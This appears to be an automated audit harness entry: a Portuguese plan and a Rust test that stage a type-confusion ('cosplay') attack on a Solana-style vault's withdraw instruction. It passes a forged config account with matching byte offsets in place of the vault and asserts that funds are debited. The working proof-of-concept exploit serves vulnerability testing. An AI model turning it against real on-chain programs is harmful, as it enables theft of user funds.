{
  "plan": "O ataque COSPLAY explora a desserializacao manual do vault por offsets fixos (8..40 autoridade, 40..48 saldo) sem validar discriminador. Preparamos uma conta legitima de vault com discriminador correto e autoridade/saldo validos, e uma conta de outro tipo (ex.: config) cujo layout nos offsets 8..40 e 40..48 coincida com a autoridade e um saldo suficiente. O baseline chama withdraw com o vault legitimo (deve ter sucesso). O ataque chama withdraw passando a conta de outro tipo no lugar do vault; se o programa aceitar, ele debita lamports da conta errada e grava o novo saldo nos offsets 40..48 da conta de outro tipo, demonstrando o dano.",
  "scenario": "let authority = Pubkey::new_unique();
let recipient = Pubkey::new_unique();

// Conta legitima de vault: discriminador (8 bytes) + autoridade (32) + saldo (8)
let mut vault_data = vec![0u8; 48];
vault_data[0..8].copy_from_slice(&[1u8; 8]);
vault_data[8..40].copy_from_slice(authority.as_ref());
vault_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
let vault = account(&env.program_id, &vault_data, Some(10_000_000));

// Conta de OUTRO tipo (config): discriminador diferente, mas offsets 8..40 e 40..48
// coincidem com autoridade e saldo esperados pelo withdraw.
let mut config_data = vec![0u8; 48];
config_data[0..8].copy_from_slice(&[2u8; 8]); // discriminador diferente do vault
config_data[8..40].copy_from_slice(authority.as_ref());
config_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
let config = account(&env.program_id, &config_data, Some(10_000_000));

let recipient_acc = wallet(1_000_000);

let amount: u64 = 500;
let mut ix_data = vec![1u8]; // IX_WITHDRAW
ix_data.extend_from_slice(&amount.to_le_bytes());

// Baseline: withdraw com o vault legitimo
let metas_ok = vec![
    AccountMeta::new(vault_key, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new(recipient, false),
];
let ix_ok = env.raw_ix(&ix_data, metas_ok);
let contas_ok = vec![
    (vault_key, vault.clone()),
    (authority, wallet(1_000_000)),
    (recipient, recipient_acc.clone()),
];
let r_ok = env.baseline("withdraw legitimo do vault", &ix_ok, &contas_ok);

// Ataque: withdraw passando a conta de outro tipo (config) no lugar do vault
let metas_atk = vec![
    AccountMeta::new(config_key, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new(recipient, false),
];
let ix_atk = env.raw_ix(&ix_data, metas_atk);
let contas_atk = vec![
    (config_key, config.clone()),
    (authority, wallet(1_000_000)),
    (recipient, recipient_acc.clone()),
];
let r = env.attack("withdraw usando conta de outro tipo como vault", &ix_atk, &contas_atk);

if r.program_result == ProgramResult::Success {
    // Dano: o saldo da conta de outro tipo foi debitado (500) e o recipient recebeu lamports
    let config_after = after(&r, &config_key);
    let recipient_after = after(&r, &recipient);
    let saldo_config = read_u64(config_after.data(), 40);
    env.effect(
        "saldo da conta de outro tipo foi debitado de 1000 para 500",
        saldo_config == 500,
    );
    env.effect(
        "recipient recebeu lamports da conta de outro tipo",
        recipient_after.lamports() > recipient_acc.lamports(),
    );
}
"
}

